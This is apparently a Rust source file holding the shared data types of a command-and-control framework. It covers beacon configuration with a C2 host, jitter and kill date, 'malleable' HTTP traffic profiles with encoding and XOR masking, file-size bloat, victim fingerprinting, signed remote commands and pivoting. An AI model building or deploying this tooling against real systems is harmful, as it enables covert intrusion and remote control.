// src/common.rs
use serde::{Deserialize, Serialize};
use chrono::{DateTime, Utc};
use tokio::sync::{mpsc, oneshot};
use std::net::SocketAddr;
use std::sync::{Arc, Mutex};
use std::collections::HashMap;
use ed25519_dalek::SigningKey;

#[derive(Serialize, Deserialize, Debug, Clone, PartialEq)]
pub enum TransportProtocol {
    #[serde(rename = "tls")]
    Tls,
    #[serde(rename = "tcp_plain")]
    TcpPlain,
    #[serde(rename = "named_pipe")]
    NamedPipe,
}

impl Default for TransportProtocol {
    fn default() -> Self { TransportProtocol::Tls }
}

// [NEW] Transformation Steps for Data
#[derive(Serialize, Deserialize, Debug, Clone)]
pub enum TransformStep {
    #[serde(rename = "base64")]
    Base64,
    #[serde(rename = "hex")]
    Hex,
    #[serde(rename = "mask")]
    Mask, // Simple XOR mask
    #[serde(rename = "prepend")]
    Prepend(String),
    #[serde(rename = "append")]
    Append(String),
}

// [NEW] HTTP Configuration Block (GET/POST)
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct HttpBlock {
    pub uris: Vec<String>,
    pub headers: HashMap<String, String>,
    pub data_transform: Vec<TransformStep>, // How to process C2 data before sending
}

impl Default for HttpBlock {
    fn default() -> Self {
        HttpBlock {
            uris: vec!["/default".into()],
            headers: HashMap::new(),
            data_transform: vec![],
        }
    }
}

// [NEW] The Malleable Profile Root
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct MalleableProfile {
    pub name: String,
    pub user_agent: String,
    pub http_get: HttpBlock,
    pub http_post: HttpBlock,
    // Determines if we strictly enforce HTTP/1.1 formatting over the raw stream
    pub format_http: bool, 
}

impl Default for MalleableProfile {
    fn default() -> Self {
        MalleableProfile {
            name: "default".into(),
            user_agent: "Mozilla/5.0".into(),
            http_get: HttpBlock::default(),
            http_post: HttpBlock::default(),
            format_http: false, // Default is raw TCP
        }
    }
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct C2Config {
    #[serde(default)]
    pub transport: TransportProtocol,
    
    // [UPDATED] Replaced Enum with Full Struct
    #[serde(default)]
    pub profile: MalleableProfile, 

    pub server_public_key: String,
    pub hash_salt: String,
    pub c2_host: String,
    pub build_id: String,
    pub tunnel_port: u16,
    pub sleep_interval: u64,
    pub jitter_min: u32,
    pub jitter_max: u32,
    #[serde(default)]
    pub bloat_mb: u64,
    #[serde(default)]
    pub debug: bool,
    #[serde(default)]
    pub kill_date: Option<i64>,
}

// ... (Rest of common.rs remains the same: ClientHello, SecuredCommand, etc.)
#[derive(Serialize, Deserialize, Debug)]
pub struct ClientHello {
    pub hostname: String,
    pub os: String,
    pub computer_id: String,
    pub exe_id: String,
    pub build_id: String,
}

#[derive(Serialize, Deserialize, Debug)]
pub struct SecuredCommand {
    pub session_id: String,
    pub counter: u64,
    pub nonce: u64,
    pub timestamp: DateTime<Utc>,
    pub command: String,
    pub signature: String,
}

impl SecuredCommand {
    pub fn get_signable_bytes(&self) -> Vec<u8> {
        format!("{}:{}:{}:{}:{}", 
            self.session_id, self.counter, self.nonce, 
            self.timestamp.to_rfc3339(), self.command
        ).into_bytes()
    }
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct CommandResponse {
    pub request_id: u64,
    pub output: String,
    pub error: String,
    pub exit_code: i32,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct PivotFrame {
    pub stream_id: u32,
    pub destination: u32,
    pub source: u32,
    pub data: Vec<u8>,
    #[serde(default)]
    pub metadata: String,
}

pub struct Session {
    pub id: u32,
    pub computer_id: String,
    pub addr: SocketAddr,
    pub hostname: String,
    pub os: String,
    pub tx: mpsc::UnboundedSender<(String, Option<oneshot::Sender<u64>>)>,
    pub signing_key: SigningKey,
    pub parent_id: Option<u32>,
}

pub type SharedSessions = Arc<Mutex<HashMap<u32, Session>>>;
